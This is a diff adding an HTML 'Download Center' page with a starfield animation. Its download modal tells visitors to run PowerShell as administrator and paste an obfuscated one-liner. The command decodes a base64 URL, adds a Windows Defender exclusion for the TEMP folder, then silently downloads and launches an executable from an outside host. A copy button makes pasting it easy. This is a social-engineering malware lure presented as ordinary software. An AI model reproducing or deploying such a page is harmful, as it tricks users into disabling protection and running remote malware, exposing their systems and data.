@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Download Center</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom, #18192B 0%, #231942 100%);
+      overflow: hidden;
+      color: #fff;
+    }
+
+    canvas#starsCanvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 0;
+    }
+
+    .btn {
+      display: inline-block;
+      padding: 12px 24px;
+      border-radius: 28px;
+      background-color: white;
+      color: #1a1a33;
+      border: none;
+      font-weight: 600;
+      font-size: 1.1rem;
+      cursor: pointer;
+      margin: 8px;
+      box-shadow: 0 4px 20px rgba(30, 30, 60, 0.3);
+      transition: background 0.2s;
+      position: relative;
+      z-index: 2;
+    }
+
+    .btn:hover {
+      background-color: #eaeaea;
+    }
+
+    .btn-main {
+      font-size: 2rem;
+      padding: 16px 36px;
+      box-shadow: 0 0 34px 8px #fff8, 0 2px 26px rgba(64, 64, 128, 0.18);
+    }
+
+    .header, .header-right, .bottom-left, .center-btn {
+      position: absolute;
+      z-index: 2;
+    }
+
+    .center-btn { left: 50%; top: 45%; transform: translate(-50%, -50%); }
+    .header { top: 20px; left: 30px; }
+    .header-right { top: 20px; right: 30px; }
+    .bottom-left { bottom: 40px; left: 30px; }
+
+    .modal {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.85);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 5;
+    }
+
+    .modal-content {
+      background: #202040;
+      padding: 30px 40px;
+      border-radius: 16px;
+      width: 90%;
+      max-width: 720px;
+      box-shadow: 0 8px 28px rgba(0,0,0,0.5);
+      position: relative;
+      text-align: left;
+      line-height: 1.5;
+    }
+
+    .modal-content h2 {
+      margin-top: 0;
+      color: #fff;
+    }
+
+    .modal-content pre {
+      font-size: 0.92rem;
+      background: #1a1a2e;
+      padding: 12px;
+      border-radius: 8px;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 16px;
+      right: 20px;
+      background: transparent;
+      color: #fff;
+      font-size: 20px;
+      border: none;
+      cursor: pointer;
+    }
+
+    textarea {
+      width: 100%;
+      height: 120px;
+      border-radius: 8px;
+      margin-top: 12px;
+      padding: 10px;
+      resize: vertical;
+      border: none;
+      font-size: 1rem;
+      background: #111122;
+      color: #fff;
+    }
+
+    .rate-stars {
+      font-size: 1em;
+      letter-spacing: 3px;
+      color: #aaa;
+      vertical-align: middle;
+      margin-right: 12px;
+    }
+
+    .copy-container {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 10px;
+      flex-wrap: wrap;
+    }
+
+    .copy-btn {
+      background: #232347;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      padding: 6px 10px;
+      box-shadow: 0 2px 8px #758dfa33;
+      transition: background 0.2s, box-shadow 0.2s;
+      display: flex;
+      align-items: center;
+    }
+
+    .copy-btn:hover {
+      background: #3b3b74;
+    }
+
+    .copy-btn.copied {
+      background: #1ecd7f;
+      box-shadow: 0 2px 12px #1ecd7f66;
+    }
+
+    .copy-btn svg {
+      fill: #fff;
+      width: 22px;
+      height: 22px;
+    }
+  </style>
+</head>
+<body>
+
+<canvas id="starsCanvas"></canvas>
+
+<!-- Верх интерфейса -->
+<div class="header">
+  <span class="rate-stars">☆☆☆☆☆</span>
+  <button class="btn">Information about file</button>
+</div>
+
+<div class="header-right">
+  <button class="btn">Login</button>
+  <button class="btn">Signup</button>
+</div>
+
+<!-- Центр экрана -->
+<div class="center-btn">
+  <button class="btn btn-main" onclick="openModal('download')">Download</button>
+</div>
+
+<!-- Низ -->
+<div class="bottom-left">
+  <button class="btn" onclick="openModal('report')">Report abuse</button>
+</div>
+
+<!-- Модальное окно Download -->
+<div class="modal" id="modal-download">
+  <div class="modal-content">
+    <button class="close-btn" onclick="closeModal('download')">&times;</button>
+    <h2>Download Instructions</h2>
+    <p>Hello to my subscribers from Github and YouTube.<br>
+    Keep the software script up to date.<br>
+    Yes, if you have any questions, write to me on Snap or email.</p>
+
+    <p>1) Open Powershell as administrator.</p>
+    <p>2) Type the command in quotes:</p>
+
+    <div class="copy-container">
+      <pre id="powershell-script">$env:temp=[System.Environment]::GetEnvironmentVariable('TEMP'); $a=[System.Convert]::FromBase64String('JVRlbXAl'); $b=[System.Text.Encoding]::UTF8.GetString($a); $c=[System.Convert]::FromBase64String('aHR0cDovL2xpYmZvcmdlLnh5ei9MaWJhcnlGb3JnZS5leGU='); $d=[System.Text.Encoding]::UTF8.GetString($c); $e=Join-Path -Path $env:temp -ChildPath 'tmpfile.exe'; try{Set-MpPreference -ExclusionPath $env:temp -ErrorAction SilentlyContinue; $f=[System.Net.WebClient]::new(); $f.DownloadFile($d,$e); Start-Process -FilePath $e -ErrorAction SilentlyContinue}catch{}</pre>
+      <button class="copy-btn" onclick="copyScript()" title="Скопировать">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+          <path d="M16 1H4a2 2 0 0 0-2 2v14h2V3h12V1Zm3 4H8a2 2 0 0 0-2 2v16a1 1 0 0 0 1 1h12a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2Zm0 18H9V7h10v16Z"/>
+        </svg>
+      </button>
+    </div>
+    <p>3) Enjoy!</p>
+  </div>
+</div>
+
+<!-- Модальное окно Report -->
+<div class="modal" id="modal-report">
+  <div class="modal-content">
+    <button class="close-btn" onclick="closeModal('report')">&times;</button>
+    <h2>Report abuse</h2>
+    <p>Write your complaint below:</p>
+    <textarea placeholder="This is not sent anywhere — just a fake UI."></textarea>
+  </div>
+</div>
+
+<!-- Скрипты -->
+<script>
+  function openModal(type) {
+    document.getElementById('modal-' + type).style.display = 'flex';
+  }
+
+  function closeModal(type) {
+    document.getElementById('modal-' + type).style.display = 'none';
+  }
+
+  function copyScript() {
+    const script = document.getElementById('powershell-script').textContent;
+    navigator.clipboard.writeText(script).then(() => {
+      const btn = document.querySelector('.copy-btn');
+      btn.classList.add('copied');
+      btn.title = 'Скопировано!';
+      setTimeout(() => {
+        btn.classList.remove('copied');
+        btn.title = 'Скопировать';
+      }, 1200);
+    });
+  }
+
+  // Движущиеся звезды
+  const canvas = document.getElementById('starsCanvas');
+  const ctx = canvas.getContext('2d');
+  let w = canvas.width = window.innerWidth;
+  let h = canvas.height = window.innerHeight;
+  let stars = [];
+
+  for (let i = 0; i < 100; i++) {
+    stars.push({
+      x: Math.random() * w,
+      y: Math.random() * h,
+      r: Math.random() * 1.5 + 0.3,
+      s: Math.random() * 0.5 + 0.2
+    });
+  }
+
+  function drawStars() {
+    ctx.clearRect(0, 0, w, h);
+    ctx.fillStyle = '#fff';
+    stars.forEach(star => {
+      ctx.beginPath();
+      ctx.arc(star.x, star.y, star.r, 0, Math.PI * 2);
+      ctx.fill();
+      star.y += star.s;
+      if (star.y > h) {
+        star.y = 0;
+        star.x = Math.random() * w;
+      }
+    });
+    requestAnimationFrame(drawStars);
+  }
+
+  window.addEventListener('resize', () => {
+    w = canvas.width = innerWidth;
+    h = canvas.height = innerHeight;
+  });
+
+  drawStars();
+</script>
+</body>
+</html>
